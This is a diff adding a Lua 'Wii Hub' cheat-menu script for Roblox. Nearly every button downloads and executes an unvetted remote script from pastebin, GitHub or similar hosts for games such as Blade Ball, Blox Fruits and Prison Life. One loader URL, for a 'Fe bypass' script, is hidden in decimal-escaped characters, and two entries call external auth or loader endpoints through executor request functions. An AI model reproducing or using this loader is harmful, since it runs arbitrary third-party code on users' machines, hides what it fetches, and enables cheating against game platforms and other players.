@@ -1,1 +1,141 @@
-h
+wait(0.2)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Wii Hub"; 
+Text = "Thanks for using Wii Hub";
+Icon = "rbxassestid=15838086592";
+Duration = 5;
+})
+wait(2)
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+TextLabel.Parent = ScreenGui
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 0.650
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.Position = UDim2.new(0.0463173874, 0, 0.0492788479, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "Wii Hub"
+TextLabel.TextColor3 = Color3.fromRGB(255, 73, 222)
+TextLabel.TextSize = 67.000
+TextLabel.TextStrokeTransparency = 0.000
+wait(1) 
+
+local Library = 
+loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local Window = Library.CreateLib("Wii Hub @k00pzskidd | .gg/WiiHub", "Ocean")
+
+local Tab = Window:NewTab("Home")
+
+local Section = Tab:NewSection("Welcome to Wii Hub")
+
+Section:NewButton("Wii Hub by @k00pzskidd", "ButtonInfo", function()    setclipboard("k00pzskidd")
+end) 
+
+local Tab = Window:NewTab("Games")
+
+local Section = Tab:NewSection("Blade ball")
+
+Section:NewButton("Blade ball 1",
+"ButtonInfo", function()    loadstring(game:HttpGet("https://pastebin.com/raw/BQ5yrsyK"))() 
+end)
+
+Section:NewButton("Blade ball 2", "ButtonInfo", function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
+end)
+
+Section:NewButton("Blade ball 3", "ButtonInfo", function()    loadstring(Game:HttpGet("https://pastebin.com/raw/bsWW7irh"))()
+end)
+
+Section:NewButton("Blade ball 4", "ButtonInfo", function()    loadstring(game:HttpGet('https://raw.githubusercontent.com/kierpogihahaxd2/MANUAL/main/Script'))()
+end)
+
+Section:NewButton("Blade ball 5", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
+end)
+
+local Section = Tab:NewSection("Blox fruits")
+
+Section:NewButton("Blox fruit 1", "ButtonInfo", function()    loadstring(game:HttpGet('https://raw.githubusercontent.com/GoblinKun009/Script/main/GoblinLoader'))()
+end)
+
+Section:NewButton("Blox fruit 2", "ButtonInfo", function()    loadstring(game:HttpGet"https://raw.githubusercontent.com/PNguyen0199/Script/main/Fai-Fao.lua")() 
+end)
+
+Section:NewButton("Blox fruit 3", "ButtonInfo", function()    loadstring(Game:HttpGet"https://raw.githubusercontent.com/ahmadsgamer2/Zekrom-Hub-X/main/Zekrom-Hub-X-exe")()
+end)
+
+local Section = Tab:NewSection("Prison life")
+
+Section:NewButton("Prison life 1", "ButtonInfo", function()  loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
+end)
+
+Section:NewButton("Prison life 2", "ButtonInfo", function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
+end)
+
+Section:NewButton("Prison life 3", "ButtonInfo", function()    loadstring(game:HttpGet("https://pastebin.com/raw/Wa3uidQr"))() 
+end) 
+
+Section:NewButton("Prison life 4", "ButtonInfo", function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
+end)
+
+local Section = Tab:NewSection("Brookhaven")
+
+Section:NewButton("Brookhaven 1", "ice hub", function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+end)
+
+Section:NewButton("Brookhaven 2", "ButtonInfo", function()   loadstring(game:HttpGet("https://pastefy.app/tIiioko4/raw"))()
+end)
+
+Section:NewButton("Brookhaven 3", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()
+end)
+
+local Section = Tab:NewSection("MM2")
+
+Section:NewButton("M mystery 1", "ButtonInfo", function()
+getgenv().mainKey = "nil"; 
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
+Section:NewButton("M mystery 2", "ButtonInfo", function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2"))() 
+end)
+
+Section:NewButton("M mystery 3", "Button", function()
+local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://itsjidy.github.io/SymphonyHub/Loader.html"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()
+end)
+
+local Section = Tab:NewSection("Car Dealership Tycoon")
+
+Section:NewButton("CDT 1", "ButtonInfo", function()  loadstring(game:HttpGet("https://astronomic.vercel.app"))()
+end)
+
+Section:NewButton("CDT 2", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
+end) 
+
+Section:NewButton("CDT 3", "ButtonInfo", function()    loadstring(game:HttpGet("https://scriptblox.com/raw/LIMITED!-Car-Dealership-Tycoon-Update-script-9099"))()
+end)
+
+local Tab = Window:NewTab("Credits")
+
+local Section = Tab:NewSection("Script credits")
+
+Section:NewButton("Owner: k00pzskidd", "ButtonInfo", function()
+    print("Clicked")
+end)
+
+Section:NewButton("Developer: k00pzskidd", "ButtonInfo", function()
+    print("Clicked")
+end)
